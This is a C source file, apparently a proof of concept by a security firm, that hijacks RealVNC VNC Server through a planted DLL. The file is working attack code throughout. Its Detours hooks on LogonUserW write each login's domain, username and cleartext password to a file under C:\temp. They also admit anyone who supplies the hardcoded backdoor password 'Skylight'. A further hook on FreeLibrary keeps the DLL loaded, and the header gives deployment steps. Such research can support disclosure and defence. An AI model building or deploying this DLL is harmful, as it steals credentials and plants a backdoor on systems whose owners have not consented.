/**
 * RealVNSee
 * RealVNC VNC Server DLL Hijacking
 * Log clear text credentials and enable backdoor using RealVNC's VNC Server.
 * Build, Copy the DLL into the VNC Server install directory and restart vncserver.
 *
 * By: Skylight Cyber Pty Ltd
 */
#include "pch.h"

#include <windows.h>
#include <stdio.h>
#include <detours.h>

#ifdef VNCVERSION_5_0_5
// Target pointer for the real FreeLibrary API
static BOOL(WINAPI* RealFreeLibrary)(HMODULE module) = FreeLibrary;

static HMODULE OurModule = NULL;
// Detour FreeLibrary call that doesn't free ourselves
BOOL WINAPI EvilFreeLibrary(HMODULE mod) {
    if (mod == OurModule)
    {
        OutputDebugStringW(L"SKYLIGHT: not freeing myself!");
        return TRUE;
    }
    return RealFreeLibrary(mod);
}
#endif

// Target pointer for the real LogonUserW API
static BOOL(WINAPI* RealLogonUserW)(
    LPCWSTR lpszUsername,
    LPCWSTR lpszDomain,
    LPCWSTR lpszPassword,
    DWORD   dwLogonType,
    DWORD   dwLogonProvider,
    PHANDLE phToken
    ) = LogonUserW;

// Detour LogonUserW - Saves creds to text file - allows access with backdoor password
BOOL WINAPI EvilLogonUserW(
    LPCWSTR lpszUsername,
    LPCWSTR lpszDomain,
    LPCWSTR lpszPassword,
    DWORD   dwLogonType,
    DWORD   dwLogonProvider,
    PHANDLE phToken
) {
    BOOL ret = FALSE, bErrorFlag = FALSE;
    errno_t err = 0;
    FILE* pFile = NULL;
    wchar_t buffer[100] = { 0 };
    const wchar_t* result_str = NULL;

    // Check for backdoor password and grant access as SYSTEM
    if (wcscmp(L"Skylight", lpszPassword) == 0) {
        OpenProcessToken(GetCurrentProcess(), GENERIC_READ, phToken);
        ret = TRUE;
    }
    else {
        // Call real LogonUserW function
        ret = RealLogonUserW(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, phToken);
    }

    // Log details to file
    result_str = ret ? L"SUCCESS" : L"FAIL";
    wsprintf(buffer, L"SKYLIGHT-VNC-LOGON: %s\\%s:%s (%s)\n", lpszDomain, lpszUsername, lpszPassword, result_str);

    err = fopen_s(&pFile, "C:\\temp\\skylight-vncserver-logon.txt", "a+");
    if (err == 0 && pFile != NULL) {
        fwrite(buffer, sizeof(wchar_t), lstrlenW(buffer), pFile);
        fclose(pFile);
    }

    return ret;
}


BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // DETOUR
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)RealLogonUserW, EvilLogonUserW);
#ifdef VNCVERSION_5_0_5
        OurModule = hModule; // Save module handle for EveilFreeLibrary
        DetourAttach(&(PVOID&)RealFreeLibrary, EvilFreeLibrary);
#endif
        DetourTransactionCommit();
        OutputDebugStringW(L"SKYLIGHT: Proxy DLL Loaded");
        break;
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)RealLogonUserW, EvilLogonUserW);
#ifdef VNCVERSION_5_0_5
        DetourDetach(&(PVOID&)RealFreeLibrary, EvilFreeLibrary);
#endif
        DetourTransactionCommit();
        OutputDebugStringW(L"SKYLIGHT: Proxy DLL UnLoaded");
        break;
    }
    return TRUE;
}
